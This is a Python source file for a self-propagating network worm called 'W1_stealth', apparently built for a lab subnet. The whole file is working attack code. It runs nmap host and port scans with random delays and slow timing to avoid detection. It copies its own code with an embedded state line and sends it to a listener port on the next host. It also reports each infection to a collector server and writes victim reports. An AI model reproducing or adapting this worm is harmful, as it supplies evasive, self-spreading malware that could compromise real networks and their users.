import socket
import nmap
import time
import random
import json
from datetime import datetime

#this is a stealthy worm that tries to blend in with normal network activity by using random delays, scanning for live hosts and open ports, and only spreading to one new host at a time. It also logs detailed information about each infection to a collector server for analysis.

#information about the worm and its configuration
SUBNET = "192.168.100.10-20"
COLLECTOR_IP = "192.168.100.10"
COLLECTOR_PORT = 8888
WORM_PORT = 9999
MAX_VICTIMS = 5


#ip discovery function that determines the local IP address of the infected host by creating a dummy socket connection to a known IP and retrieving the socket's own address. This is a common technique to get the local IP without relying on external services.
def get_my_ip():
    print("[*] Determining local IP...")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.100.1", 80))
    ip = s.getsockname()[0]
    s.close()
    print(f"[+] My IP: {ip}")
    return ip


#random delay function that generates a random sleep time between 10 and 60 seconds to simulate normal user behavior and avoid detection by security systems. The delay is printed to the console for visibility.
def random_delay():
    delay = random.uniform(10, 60)
    print(f"[~] Sleeping for {round(delay,2)} seconds")
    time.sleep(delay)

#host discovery function that uses the nmap library to perform a ping scan (-sn) on the specified subnet to find live hosts. The scan is performed with a random timing template (T1 or T2) to further obfuscate the worm's activity. The discovered live hosts are printed and returned as a list.
def discover_hosts():
    print("[*] Starting host discovery...")
    nm = nmap.PortScanner()
    random_delay()
    nm.scan(hosts=SUBNET, arguments=f'-sn -T{random.randint(1,2)}')
    live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
    random.shuffle(live_hosts)
    print(f"[+] Live hosts discovered: {live_hosts}")
    return live_hosts


#port scanning function that takes a list of hosts and scans them for common open ports (21, 22, 80, 443, 3306, 8080) using nmap. The scan is performed with a random timing template (T1 or T2) and a shorter random delay before each scan to speed up the process while still trying to avoid detection. The open ports for each host are collected in a dictionary and printed to the console.
def scan_ports(hosts):
    print("[*] Starting port scan...")
    nm = nmap.PortScanner()
    port_data = {}
    for host in hosts:
        print(f"[~] Scanning ports on {host}")
        time.sleep(random.uniform(3, 8))  # shorter delay for port scan
        nm.scan(hosts=host, arguments=f'-T{random.randint(1,2)} -p 21,22,80,443,3306,8080')
        open_ports = []
        if host in nm.all_hosts():
            for port in [21, 22, 80, 443, 3306, 8080]:
                try:
                    if nm[host]['tcp'][port]['state'] == 'open':
                        open_ports.append(port)
                except:
                    pass
        print(f"[+] {host} open ports: {open_ports if open_ports else 'none'}")
        port_data[host] = open_ports
    return port_data


def save_victim_report(my_ip, source_ip, hop_count, live_hosts, port_data, target_ip, elapsed, log_sent):
    print("[*] Writing victim report...")
    with open("victim_report.txt", "w") as f:
        f.write("===== INFECTION REPORT =====\n")
        f.write(f"Victim IP        : {my_ip}\n")
        f.write(f"Infected By      : {source_ip}\n")
        f.write(f"Infection Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Hop Count        : {hop_count}\n")
        f.write(f"Worm Type        : W1_stealth\n\n")
        f.write("===== NETWORK SCAN RESULTS =====\n")
        f.write(f"Live Hosts Found : {', '.join(live_hosts)}\n\n")
        f.write("===== PORT SCAN RESULTS =====\n")
        for host, ports in port_data.items():
            f.write(f"{host}   : {', '.join(map(str, ports)) if ports else 'none'}\n")
        f.write(f"\n===== SPREAD DECISION =====\n")
        f.write(f"Spreading To     : {target_ip}\n")
        f.write(f"Reason           : First uninfected host found\n")
        f.write(f"Time To Spread   : {elapsed} seconds\n\n")
        f.write("===== COLLECTOR STATUS =====\n")
        f.write(f"Log Sent To      : {COLLECTOR_IP}:{COLLECTOR_PORT}\n")
        f.write(f"Log Send Success : {log_sent}\n")
    print("[+] Victim report saved")

#log sending function that attempts to connect to the collector server and send a JSON-encoded log of the infection details. The function handles exceptions and returns whether the log was successfully sent or not, while printing the status to the console.
def send_log(data):
    print("[*] Sending infection log to collector...")
    success = False
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((COLLECTOR_IP, COLLECTOR_PORT))
        s.sendall(json.dumps(data).encode())
        s.close()
        success = True
        print("[+] Log successfully sent to collector")
    except:
        print("[-] Failed to send log to collector")
    return success

def spread(target_ip, my_ip, hop_count, live_hosts, port_data, infected):
    print(f"[!] Attempting infection: {my_ip} → {target_ip}")
    try:
        with open(__file__, "r") as f:
            lines = f.readlines()

        # strip old state line if present
        if lines[0].startswith("# STATE:"):
            lines = lines[1:]
        worm_code = "".join(lines)

        # inject new state as first line
        state = json.dumps({
            "source_ip": my_ip,
            "hop_count": hop_count,
            "infected": infected
        })
        final_code = f"# STATE:{state}\n" + worm_code

        random_delay()
        start = time.time()
        s = socket.socket()
        s.settimeout(5)
        print(f"[~] Connecting to {target_ip}:{WORM_PORT}")
        s.connect((target_ip, WORM_PORT))
        s.sendall(final_code.encode())
        s.close()
        elapsed = round(time.time() - start, 2)
        print(f"[+] Infection successful ({elapsed}s)")
        return True, elapsed

    except Exception as e:
        print(f"[-] Infection failed: {target_ip} — {e}")
        return False, 0

#main function that orchestrates the worm's behavior. It starts by determining the local IP and attempting to read the infection state from the first line of its own file. If no state is found, it initializes a fresh state. The worm then enters a loop where it performs host discovery, port scanning, selects a target, and attempts to spread. After each successful infection, it logs the details to the collector and saves a victim report. The loop continues until the maximum number of victims is reached or no valid targets are found.
def main():
    print("================================")
    print("      W1 STEALTH WORM START     ")
    print("================================")

    my_ip = get_my_ip()

    # read state from first line of own file
    try:
        with open(__file__, "r") as f:
            first_line = f.readline()
        if first_line.startswith("# STATE:"):
            state = json.loads(first_line[8:])
            source_ip = state["source_ip"]
            hop_count = state["hop_count"]
            infected = state["infected"]
            print(f"[+] State loaded — source: {source_ip}, hop: {hop_count}, infected: {infected}")
        else:
            raise ValueError("no state")
    except:
        source_ip = my_ip
        hop_count = 0
        infected = [my_ip]
        print("[+] Fresh start on Kali")

    while len(infected) < MAX_VICTIMS + 1:
        print("\n[*] Beginning propagation cycle")
        random_delay()

        live_hosts = discover_hosts()
        port_data = scan_ports([h for h in live_hosts if h not in infected and h != COLLECTOR_IP])

        target = None
        for h in live_hosts:
            if h not in infected and h != COLLECTOR_IP:
                target = h
                break

        if not target:
            print("[!] No valid targets found")
            break

        print(f"[+] Target selected: {target}")
        hop_count += 1

        success, elapsed = spread(target, my_ip, hop_count, live_hosts, port_data, infected)

        if success:
            # log sent here with correct IPs
            log = {
                "worm_type": "W1_stealth",
                "source_ip": my_ip,
                "infected_ip": target,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "hop_count": hop_count,
                "live_hosts_found": live_hosts,
                "open_ports": port_data,
                "spread_to": target,
                "spread_success": True,
                "time_to_spread": elapsed
            }
            log_sent = send_log(log)
            save_victim_report(my_ip, source_ip, hop_count, live_hosts, port_data, target, elapsed, log_sent)

            infected.append(target)
            source_ip = my_ip
            my_ip = target
            print(f"[+] Infection chain updated: {infected}")

main()